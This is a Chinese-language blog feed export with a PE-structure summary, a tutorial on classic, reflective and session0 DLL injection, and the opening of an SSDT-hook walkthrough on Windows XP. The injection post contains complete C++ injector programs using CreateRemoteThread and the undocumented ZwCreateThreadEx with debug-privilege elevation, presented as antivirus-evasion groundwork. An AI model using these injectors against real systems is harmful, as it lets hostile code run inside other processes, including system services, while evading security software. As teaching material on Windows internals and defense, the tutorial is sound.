<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMAGE_RESOURCE_DATA_ENTRY STRUCT</span><br><span class="line">&#123;</span><br><span class="line">	DWORD OffsetToData; 			//资源数据的RVA</span><br><span class="line">	DWORD Size;						 //资源数据的长度</span><br><span class="line">	DWORD CodePage; 				//代码页, 一般为0</span><br><span class="line">	DWORD Reserved; 				//保留字段</span><br><span class="line">&#125;IMAGE_RESOURCE_DATA_ENTRY;</span><br></pre></td></tr></table></figure>

<p>此处的 IMAGE_RESOURCE_DATA_ENTRY 结构就是真正的资源数据了。结构中的OffsetOfData 指向资源数据的指针，其为 RVA 值。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上就是看小甲鱼的PE结构系列课的总结，再次感谢小甲鱼！</p>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>dll注入与session0注入</title>
    <url>/2023/08/31/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<center>本篇主要介绍传统的dll注入,反射dll以及利用内核API的session0注入</center>

<span id="more"></span>

<h1 id="传统dll注入"><a href="#传统dll注入" class="headerlink" title="传统dll注入"></a>传统dll注入</h1><p>所谓dll注入就是将一个dll(动态链接库)加载到要被注入的进程的内存空间，使其成为进程的一部分。</p>
<h2 id="1-dll注入步骤"><a href="#1-dll注入步骤" class="headerlink" title="1.dll注入步骤"></a>1.dll注入步骤</h2><p>传统的dll注入大致可以分为以下几个步骤：</p>
<table>
<thead>
<tr>
<th>步骤</th>
<th>所用API</th>
</tr>
</thead>
<tbody><tr>
<td>打开要注入的进程</td>
<td>OpenProcess</td>
</tr>
<tr>
<td>在进程的内存中申请内存空间</td>
<td>virtualAllocEx</td>
</tr>
<tr>
<td>写入内存</td>
<td>writeProcessMemory</td>
</tr>
<tr>
<td>从kenrel32.dll中获取LoadLibrary</td>
<td>GetProcAddress</td>
</tr>
<tr>
<td>创建远程线程加载dll</td>
<td>CreateRemoteThread</td>
</tr>
<tr>
<td>等待线程函数结束</td>
<td>WaitForSingleObject</td>
</tr>
<tr>
<td>释放dll空间</td>
<td>VirtualFreeEx</td>
</tr>
<tr>
<td>关闭句柄</td>
<td>CloseHandle</td>
</tr>
</tbody></table>
<h2 id="2-代码实践"><a href="#2-代码实践" class="headerlink" title="2.代码实践"></a>2.代码实践</h2><p>目标：通过dll注入使加载notepad时弹出消息框，显示“dll注入成功”。</p>
<p>首先在vs中创建一个dll项目，dll代码如下图所示</p>
<p><img src="/images/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/image-20230831124516436.png" alt="image-20230831124516436"></p>
<p>创建一个用于注入dll的(中转)程序</p>
<p>代码如下(使用c++)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;tchar.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line">#include&lt;TlHelp32.h&gt;//CreateToolhelp32Snapshot在此头文件中,获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br><span class="line">DWORD GetProcessPID(LPCTSTR lpProcessName) &#123;</span><br><span class="line">    DWORD Ret = 0;</span><br><span class="line">    PROCESSENTRY32 p32;//描述获取快照时驻留在系统地址空间中的进程的列表中的条目</span><br><span class="line">    HANDLE lpSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//如果函数失败，它将返回 INVALID_HANDLE_VALUE</span><br><span class="line">    //TH32CS_SNAPPROCESS包括系统快照中的所有进程</span><br><span class="line">    if (lpSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        printf(&quot;获取进程快照失败，error:%d&quot;, ::GetLastError());</span><br><span class="line">        return Ret;</span><br><span class="line">    &#125;</span><br><span class="line">    p32.dwSize = sizeof(PROCESSENTRY32);</span><br><span class="line">    ::Process32First(lpSnapshot,&amp;p32); //检索有关系统快照中遇到的第一个进程的信息。</span><br><span class="line">    do &#123;</span><br><span class="line">        if (!lstrcmp(p32.szExeFile, lpProcessName)) &#123;</span><br><span class="line">            Ret = p32.th32ProcessID;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while (::Process32Next(lpSnapshot, &amp;p32));</span><br><span class="line">    ::CloseHandle(lpSnapshot);</span><br><span class="line">    return Ret;</span><br><span class="line">&#125;</span><br><span class="line">//dll注入的主要过程实现函数</span><br><span class="line">DWORD RemoteThreadInject(DWORD pid, LPCWSTR DllName) &#123;</span><br><span class="line">    DWORD size = 0;</span><br><span class="line">    DWORD DllAddr = 0;</span><br><span class="line">    //1.打开进程</span><br><span class="line">    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    if (hprocess == NULL) &#123;</span><br><span class="line">        printf(&quot;OpenProcess error!\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    //2.计算dll路径长度</span><br><span class="line">    size = (wcslen(DllName) + 1) * sizeof(TCHAR);</span><br><span class="line">    //申请空间</span><br><span class="line">    LPVOID pAllocMemory = VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    //MEM_COMMIT 从指定保留内存页的磁盘的总内存大小和分页文件分配内存费用。 函数还保证当调用方稍后最初访问内存时，内容将为零。 除非实际访问虚拟地址，否则不会分配实际物理页面。</span><br><span class="line">    //PAGE_READWRITE 内存保护选项</span><br><span class="line">    if (pAllocMemory == NULL) &#123;</span><br><span class="line">        printf(&quot;申请内存空间失败\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    //3.写入内存</span><br><span class="line">    BOOL write = WriteProcessMemory(hprocess, pAllocMemory, DllName, size, NULL);</span><br><span class="line">    if (pAllocMemory == 0) &#123;</span><br><span class="line">        printf(&quot;写入内存失败\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    //4.从kenrel32.dll中获取LoadLibrary</span><br><span class="line">    FARPROC pThread = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;);</span><br><span class="line">    //GetProcAddress返回值是导出的函数或变量的地址</span><br><span class="line">    LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUTINE)pThread;</span><br><span class="line">    //LPTHREAD_START_ROUTINE是一个指向已经开始执行的代码的指针</span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hprocess, NULL, 0, addr, pAllocMemory, 0, NULL);</span><br><span class="line">    if (hThread == NULL) &#123;</span><br><span class="line">        printf(&quot;创建线程失败\n&quot;);</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    //6.等待线程结束</span><br><span class="line">    WaitForSingleObject(hThread, -1);//-1为直到线程结束才停止</span><br><span class="line">    //7.释放DLL空间</span><br><span class="line">    VirtualFreeEx(hprocess, pAllocMemory, size, MEM_DECOMMIT);</span><br><span class="line">    //8.关闭句柄</span><br><span class="line">    CloseHandle(hprocess);</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">int wmain(int argc,wchar_t* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    if (argc != 3) &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;参数数量不对\n&quot;;</span><br><span class="line">        std::cout &lt;&lt; &quot;格式为DLLInject.exe &lt;被注入进程名&gt; &lt;DLL路径&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD PID = GetProcessPID(argv[1]);</span><br><span class="line">    if (PID == 0) &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;不存在该进程\n&quot;;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    RemoteThreadInject(PID, argv[2]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将dll与中转程序放入虚拟机运行。用cmd.exe运行中转程序，传入中转程序名，进程名以及dll名。</p>
<p><img src="/images/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/image-20230831135621279.png" alt="image-20230831135621279"></p>
<p>成功！</p>
<p>但是传统DLL注入会遇到如下问题：</p>
<p>1.CreateRemoteThread为用户态API,没用权限注入系统服务进程。</p>
<p>2.需要使用LoadLibrary向进程中注入，容易被查杀。</p>
<p>对于第一个问题我们可以使用session0注入的方式调用ZwCreateThreadEx的方式解决。</p>
<p>对于第二个问题我们可以采用下面所说的反射DLL。</p>
<h1 id="反射dll"><a href="#反射dll" class="headerlink" title="反射dll"></a>反射dll</h1><p>反射型dll注入使用ReflectiveLoader代替LoadLibrary,从而避免了向进程注册DLL模块。</p>
<h2 id="1-反射DLL的注入流程"><a href="#1-反射DLL的注入流程" class="headerlink" title="1.反射DLL的注入流程"></a>1.反射DLL的注入流程</h2><p>1.获取被注入进程未解析的dll基地址。</p>
<p>2.获取必要的dll句柄和函数为修复导入表做准备。</p>
<p>3.将DLL文件头写入内存。</p>
<p>4.通过解析区块表将每个区块写入内存。</p>
<p>3.修复导入表和重定向表。</p>
<p>4.调用DLLMain函数的入口点。</p>
<h2 id="2-代码实现与解析"><a href="#2-代码实现与解析" class="headerlink" title="2.代码实现与解析"></a>2.代码实现与解析</h2><p>具体实现代码可以参照下面的项目以及一位大佬的讲解。</p>
<p><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/599022106">https://zhuanlan.zhihu.com/p/599022106</a></p>
<h1 id="session0注入"><a href="#session0注入" class="headerlink" title="session0注入"></a>session0注入</h1><p>在Windows XP、Windows Server 2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（Session）运行，而这个会话是由第一个登录到控制台的用户启动的。该会话就叫做Session 0。在介绍session0注入之前，我们先介绍以下两个概念。</p>
<h2 id="1-未导出API与未文档化API"><a href="#1-未导出API与未文档化API" class="headerlink" title="1.未导出API与未文档化API"></a>1.未导出API与未文档化API</h2><p>未导出API:在0环里实现。但是没有从dll导出，3环程序无法使用，不能用GetProAccess获取。可以使用特征码匹配来获取。</p>
<p>未文档化API:没有写入开发文档，在DLL里面能够看到，但是不知道参数，无法直接用，可以查找逆向内核的大佬的网站来查看参数，定义结构，用GetProAccess获取。</p>
<h2 id="2-session0注入的原理"><a href="#2-session0注入的原理" class="headerlink" title="2.session0注入的原理"></a>2.session0注入的原理</h2><p>session0注入就是利用了ZwCreateThreadEx这个未文档化API,实现了注入系统服务进程的功能。ZwCreateThreadEx 函数可以突破SESSION 0 隔离，将DLL注入到SESSION 0 隔离的系统服务进程中，CreateRemoteThread 注入系统进程会失败的原因是因为调用 ZwCreateThreadEx 创建远程线程时，第七个参数 CreateThreadFlags 为1。这样 会导致线程创建完成后一直挂起无法恢复进程运行，导致注入失败。</p>
<p>注：感兴趣的友友可以自己用ida以及0环windbg调试器追踪CreateRemoteThread以及CreateThread的调用。</p>
<h2 id="3-session0注入的步骤"><a href="#3-session0注入的步骤" class="headerlink" title="3.session0注入的步骤"></a>3.session0注入的步骤</h2><p>1.打开注入进程，获取进程句柄</p>
<p>2.在注入的进程申请内存地址</p>
<p>3.写入内存地址</p>
<p>4.获取LoadLibraryA函数地址</p>
<p>5.加载ntdll</p>
<p>6.获取ZwCreateThreadEx函数地址</p>
<p>7.使用 ZwCreateThreadEx 创建远线程，实现 DLL 注入</p>
<p>8.关闭句柄</p>
<p>注意：session0函数的重点必须拿到 SE_PRIVILEGE_ENABLED 权限，所以需要提权</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessPID</span><span class="params">(<span class="type">char</span>* lpProcessName)</span> </span>&#123;</span><br><span class="line">    DWORD Ret = <span class="number">0</span>;</span><br><span class="line">    tagPROCESSENTRY32 p32;</span><br><span class="line">    HANDLE lpSnapshot = ::<span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (lpSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;获取进程快照失败，error:%d&quot;</span>, ::<span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> Ret;</span><br><span class="line">    &#125;</span><br><span class="line">    p32.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    ::<span class="built_in">Process32First</span>(lpSnapshot, &amp;p32);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">lstrcmpA</span>(p32.szExeFile, lpProcessName)) &#123;</span><br><span class="line">            Ret = p32.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (::<span class="built_in">Process32Next</span>(lpSnapshot, &amp;p32));</span><br><span class="line">    ::<span class="built_in">CloseHandle</span>(lpSnapshot);</span><br><span class="line">    <span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//提权函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    BOOL fok = FALSE;</span><br><span class="line">    <span class="comment">//OpenProcessToken 函数打开与进程关联的访问令牌。</span></span><br><span class="line">    <span class="comment">//第二个参数指定一个 访问掩码，该掩码 指定访问令牌的请求访问类型</span></span><br><span class="line">    <span class="comment">//OKEN_ADJUST_PRIVILEGES	启用或禁用访问令牌中的特权所必需的。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))&#123;</span><br><span class="line">        <span class="comment">//TOKEN_PRIVILEGES 结构包含有关访问令牌的一组特权的信息。</span></span><br><span class="line">        <span class="comment">//每个结构都包含特权的 LUID 和属性</span></span><br><span class="line">        TOKEN_PRIVILEGES tp;</span><br><span class="line">        tp.PrivilegeCount = <span class="number">1</span>;<span class="comment">//这必须设置为 Privileges 数组中的条目数</span></span><br><span class="line">        <span class="comment">//LookupPrivilegeValue 函数检索本地唯一标识符 (LUID) 指定系统上用于本地表示指定特权名称。</span></span><br><span class="line">        <span class="comment">//第二个参数该字符串指定权限的名称</span></span><br><span class="line">        <span class="comment">//第三个参数指向一个变量的指针，该变量接收 LUID</span></span><br><span class="line">        <span class="comment">//E_DEBUG_NAME 调试和调整另一个帐户拥有的进程内存所必需的。</span></span><br><span class="line">        <span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">        <span class="comment">//SE_PRIVILEGE_ENABLED 权限已启用。</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">        <span class="comment">//AdjustTokenPrivileges 函数启用或禁用指定访问令牌中的特权</span></span><br><span class="line">        <span class="comment">//第一个参数访问令牌的句柄，其中包含要修改的权限。 句柄必须具有对令牌TOKEN_ADJUST_PRIVILEGES访问权限</span></span><br><span class="line">        <span class="comment">//第二参数指定函数是否禁用令牌的所有特权。 如果此值为 TRUE，则函数将禁用所有特权并忽略 NewState 参数。 如果为 FALSE，则函数根据第三个参数 参数指向的信息修改权限。</span></span><br><span class="line">        <span class="comment">//第三个参数指向 TOKEN_PRIVILEGES 结构的指针，该结构指定特权数组及其属性</span></span><br><span class="line">        <span class="comment">//第四个参数指定第三个参数指向的缓冲区的大小（以字节为单位）</span></span><br><span class="line">        <span class="comment">//第五个参数指向函数用 TOKEN_PRIVILEGES 结构填充的缓冲区的指针，该结构包含函数修改的任何特权的先前状态</span></span><br><span class="line">        <span class="comment">//第六个参数指向变量的指针，该变量接收第五个参数指向的缓冲区的所需大小（以字节为单位）</span></span><br><span class="line">        <span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        fok = (<span class="built_in">GetLastError</span>() == ERROR_SUCCESS);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">ZwCreateThreadExInject</span><span class="params">(DWORD PID, <span class="type">const</span> <span class="type">char</span>* pszDllFileName)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">EnableDebugPrivilege</span>();</span><br><span class="line">    HANDLE hRemoteThread;</span><br><span class="line">    DWORD dwStatus = <span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, PID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;打开进程失败,error:&quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZE_T dwSize = <span class="built_in">lstrlenA</span>(pszDllFileName) + <span class="number">1</span>;</span><br><span class="line">    LPVOID pDllAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pDllAddr) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;申请内存空间失败\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">WriteProcessMemory</span>(hProcess, pDllAddr, pszDllFileName, dwSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;写入内存失败\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    HMODULE hNtdllDll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == hNtdllDll) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;加载ntdll.dll失败\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FARPROC pFuncProcAddr = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="comment">//网上找的ZwCreateThreadEx的参数形式</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64 </span></span><br><span class="line">     <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span> <span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">     PHANDLE ThreadHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">     ACCESS_MASK DesiredAccess, </span></span></span><br><span class="line"><span class="params"><span class="function">     LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">     HANDLE ProcessHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">     LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">     LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">     ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">     SIZE_T ZeroBits, SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">     SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">     LPVOID pUnkown)</span></span>;</span><br><span class="line">    <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">        PHANDLE ThreadHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">        ACCESS_MASK DesiredAccess, </span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID ObjectAttributes, </span></span></span><br><span class="line"><span class="params"><span class="function">        HANDLE ProcessHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">        LPTHREAD_START_ROUTINE lpStartAddress, </span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID lpParameter, </span></span></span><br><span class="line"><span class="params"><span class="function">        BOOL CreateSuspended, </span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dwStackSize, </span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dw1, </span></span></span><br><span class="line"><span class="params"><span class="function">        DWORD dw2, </span></span></span><br><span class="line"><span class="params"><span class="function">        LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    typedef_ZwCreateThreadEx ZwCreateThreadEx=(typedef_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;获取ZwCreateThreadEx失败\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dwStatus = <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">FreeLibrary</span>(hNtdllDll);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;参数数量不对\n&quot;</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;格式为session0注入.exe &lt;被注入进程名&gt; &lt;DLL路径&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> PID= <span class="built_in">GetProcessPID</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">ZwCreateThreadExInject</span>(PID, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>放入虚拟机，用cmd.exe运行，得到如图</p>
<p><img src="/images/dll%E6%B3%A8%E5%85%A5%E4%B8%8Esession0%E6%B3%A8%E5%85%A5/image-20230901202310296.png" alt="image-20230901202310296"></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>刚开始写博客，哪里有错误或者写的不好的地方欢迎各位大佬指出！感谢，后续会有更多免杀内容分享！</p>
]]></content>
      <categories>
        <category>免杀基础</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>初试SSDT hook</title>
    <url>/2023/10/16/%E5%88%9D%E8%AF%95SSDT-hook/</url>
    <content><![CDATA[<p>SSDT hook是杀毒软件常用的检测目标程序是否调用敏感Windows API，从而识别出木马病毒的手段，因为x64版本的Windows操作系统开启了PatchGuard保护，使得SSDT hook变得异常困难，于是本篇将以Windows xp为例，展示SSDT hook的魅力。下面就让我们看看什么是SSDT表。</p>
<span id="more"></span>

<h1 id="追踪SSDT表"><a href="#追踪SSDT表" class="headerlink" title="追踪SSDT表"></a>追踪SSDT表</h1><p>SSDT是一张表，即系统服务描述符表，用于处理应用层通过<strong>Kernel32.dll</strong>下发的各个API操作请求。下面我们使用windbg跟踪来介绍SSDT表。</p>
<p>首先输入以下命令，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br></pre></td></tr></table></figure>

<p>得到结果如图所示</p>
<p><img src="/images/%E5%88%9D%E8%AF%95SSDT-hook/image-20231016215013757.png" alt="image-20231016215013757"></p>
<p>第一个参数指向的地址存储的是全部的内核函数(80501b8c)。</p>
<p>第二个参数代表ssdt表里面有多少个内核函数(0x11c)。</p>
<p>第三个参数是一个指针指向一个地址，这里表示的是与上面的内核函数相对应的参数个数，例如第一个为0x18，参数个数就为0x18&#x2F;4 &#x3D; 6</p>
<h2 id="SSDT中的一个例子"><a href="#SSDT中的一个例子" class="headerlink" title="SSDT中的一个例子"></a>SSDT中的一个例子</h2><p>以OpenProcess为例。这里找一下 OpenProcess 在SSDT表的索引，首先bp OpenProcess</p>
<p><img src="/images/%E5%88%9D%E8%AF%95SSDT-hook/image-20231016203348136.png" alt="image-20231016203348136"></p>
<p>断在了 kerner32.OpenProcess ，这里 OpenProcess 会调用ntdll里面的 ZwOpenProcess 进入ring0， 在ring0 ZwOpenProcess 又会调用 NtOpenProcess。</p>
<p><img src="/images/%E5%88%9D%E8%AF%95SSDT-hook/image-20231016204050145.png" alt="image-20231016204050145"></p>
<p>跟随进去发现<code>mov eax,0x7A</code>，那么这里 ZwOpenProcess 的索引就为0x7A。</p>
<p><img src="/images/%E5%88%9D%E8%AF%95SSDT-hook/image-20231016204328213.png" alt="image-20231016204328213"></p>
<p>然后通过 KeServiceDescriptorTable 找到所有的内核函数，通过内核函数+偏移找到 OpenProcess 函数。</p>
<p><img src="/images/%E5%88%9D%E8%AF%95SSDT-hook/image-20231016215037136.png" alt="image-20231016215037136"></p>
<p>在 NT 4.0 以上的 Windows 操作系统中，默认就存在两个系统服务描述表，这两个调度表对应了两类不同的系统服务，这两个调度表为： KeServiceDescriptorTable 和 KeServiceDescriptorTableShadow ，其中 KeServiceDescriptorTable 主要是处理来自 ring3 。kernel32.dll 中的系统调用，而 KeServiceDescriptorTableShadow 则主要处理来自 User32.dll 和 GDI32.dll 中的系统调用，并且KeServiceDescriptorTable 在 ntoskrnl.exe 是导出的，而KeServiceDescriptorTableShadow 则是没有被 Windows 操作系统所导出。</p>
<p><strong>关于 SSDT 的全部内容则都是通过 KeServiceDescriptorTable 来完成的</strong></p>
<h2 id="SSDT表的结构"><a href="#SSDT表的结构" class="headerlink" title="SSDT表的结构"></a>SSDT表的结构</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _KSERVICE_TABLE_DESCRIPTOR &#123; </span><br><span class="line">KSYSTEM_SERVICE_TABLE ntoskrnl; // ntoskrnl.exe 的服务函数 </span><br><span class="line">KSYSTEM_SERVICE_TABLE win32k; // win32k.sys 的服务函数(GDI32.dll/User32.dll 的 内核支持) </span><br><span class="line">KSYSTEM_SERVICE_TABLE notUsed1; </span><br><span class="line">KSYSTEM_SERVICE_TABLE notUsed2; </span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, * PKSERVICE_TABLE_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<p>其中每一项又是一个结构体 KSYSTEM_SERVICE_TABLE ，通过结构体表示为如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _KSYSTEM_SERVICE_TABLE &#123; </span><br><span class="line">PULONG ServiceTableBase; // SSDT (System Service Dispatch Table)的基地址 </span><br><span class="line">PULONG ServiceCounterTableBase; // 用于 checked builds, 包含 SSDT 中每个服务被调用的次数</span><br><span class="line">ULONG NumberOfService; // 服务函数的个数, NumberOfService * 4 就是整个地址表的大小</span><br><span class="line">ULONG ParamTableBase; // SSPT(System Service Parameter Table)的基地址 </span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, * PKSYSTEM_SERVICE_TABLE;</span><br></pre></td></tr></table></figure>

<p>SSDT表大致介绍到这里，但是要实现SSDT hook还需要另一块知识，系统调用。</p>
